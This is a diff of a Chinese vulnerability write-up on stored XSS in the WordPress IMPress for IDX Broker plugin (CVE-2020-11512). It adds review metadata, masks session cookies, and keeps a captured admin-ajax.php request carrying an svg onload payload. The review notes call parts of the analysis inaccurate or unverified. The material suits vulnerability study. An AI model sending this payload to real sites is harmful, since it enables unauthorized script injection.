@@ -1,7 +1,43 @@
 ---
 cve: "CVE-2020-11512"
 source: "白阁文库 BaizeSec/bylibrary"
+product: "WordPress IMPress for IDX Broker"
+record_type: "analysis"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: "CVE-2020-11512; CVE-2020-9514"
+referenced_identifiers: ""
+identifier_role: "primary"
+identifier_status: "unknown"
+title: "Wordpress IMPress for IDX Broker 低权限xss漏洞"
+prerequisites: "来源所述条件，未列明部分仍待核：subscriber session;11512adminviewsrecaptcha setting;9514wrapper page identifiers; plugin versions omitted"
+side_effects: "未执行；本文需注意的操作影响：frontmatter只有11512，正文9514页面修改/删除是第二主漏洞"
+source_status: "unknown"
+id: "vw-1f3041d11f00c5eccb29c42c"
+entity_id: "ve-1f3041d11f00c5eccb29c42c"
+schema_version: "1"
 ---
+
+## 核对与使用边界
+
+- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。
+
+本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
+
+适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：subscriber session;11512adminviewsrecaptcha setting;9514wrapper page identifiers; plugin versions omitted
+
+- **操作与副作用边界（1）**：frontmatter只有11512，正文9514页面修改/删除是第二主漏洞。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。
+
+- **证据待核（2）**：wp_protect_special_option被错说成对option名HTML过滤；缺输出转义才是XSS链关键。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。
+
+- **结论使用边界（3）**：说is_user_logged_in只判断用户存在不精确，应说登录状态不检查具体capability。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。
+
+- **凭据与会话边界（4）**：HTTP Content-Length0却带body，编号列表污染报文；Cookie应脱敏。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。
+
+- **事实待核（5）**：大量操作截图内容全丢失，9514仅文字结论无请求；缺版本/原始补丁链接。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。
+
+历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。
 
 # Wordpress IMPress for IDX Broker 低权限xss漏洞
 
@@ -37,18 +73,22 @@ source: "白阁文库 BaizeSec/bylibrary"
 
 ```
 
+```http
+
 1. 		POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1
 2. 		Host: localhost
 3. 		User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
 4. 		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
 5. 		Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 6. 		Connection: close
-7. 		Cookie:  wordpress_bbfa5b726c6b7a9cf3cda9370be3ee91=user1%7C1591004988%7CPrKGAmfSsNxfsQ9QAGID3aK8sMmvLnJtimfdGugoqCN%7C2850d94c57420c45398bd86aa49445eb60914036c0482cd3ebc755de5a8b1239; wordpress_test_cookie=WP+Cookie+check;  wordpress_logged_in_bbfa5b726c6b7a9cf3cda9370be3ee91=user1%7C1591004988%7CPrKGAmfSsNxfsQ9QAGID3aK8sMmvLnJtimfdGugoqCN%7Cc1e4006d123d6f33199624e0a514319b21b93859faa5af2a60fc0ceda066fb73; wp-settings-time-2=1590832197
+7. 		Cookie:  wordpress_bbfa5b726c6b7a9cf3cda9370be3ee91=use*****************************************************************************************************************************239; wordpress_test_cookie=WP+Cookie+check;  wordpress_logged_in_bbfa5b726c6b7a9cf3cda9370be3ee91=use*****************************************************************************************************************************b73; wp-settings-time-2=1590832197
 8. 		Upgrade-Insecure-Requests: 1
 9. 		Content-Type: application/x-www-form-urlencoded
 10. 		Content-Length: 0
 11. 		 
 12. 		action=idx_update_recaptcha_key&idx_recaptcha_site_key=a22212322123"><svg onload=alert(/~xss~/)>'
+
+```
 
 
 
